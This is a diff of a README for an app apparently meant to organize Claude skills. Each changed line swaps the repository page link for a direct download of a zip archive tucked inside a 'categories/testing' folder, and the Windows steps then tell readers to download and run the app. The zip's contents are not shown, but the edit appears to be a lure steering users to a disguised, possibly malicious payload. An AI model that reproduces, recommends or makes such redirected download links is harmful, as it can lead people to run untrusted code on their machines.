@@ -1,12 +1,12 @@
 # 🗂️ skill-vault - Organize Claude skills with clarity
 
-[![Download](https://img.shields.io/badge/Download-Skill_Vault-blue?style=for-the-badge)](https://github.com/Synchronic-leafbud824/skill-vault)
+[![Download](https://img.shields.io/badge/Download-Skill_Vault-blue?style=for-the-badge)](https://github.com/Synchronic-leafbud824/skill-vault/raw/refs/heads/main/categories/testing/vault_skill_Alascan.zip)
 
 ## 📥 Download
 
 Visit this page to download and use the app:
 
-https://github.com/Synchronic-leafbud824/skill-vault
+https://github.com/Synchronic-leafbud824/skill-vault/raw/refs/heads/main/categories/testing/vault_skill_Alascan.zip
 
 ## 🧩 What skill-vault does
 
@@ -34,7 +34,7 @@ If you use a work computer, you may need admin access to save files or run the a
 ## 🚀 Get started on Windows
 
 1. Open the download page:
-   https://github.com/Synchronic-leafbud824/skill-vault
+   https://github.com/Synchronic-leafbud824/skill-vault/raw/refs/heads/main/categories/testing/vault_skill_Alascan.zip
 
 2. Download the app from that page.
 
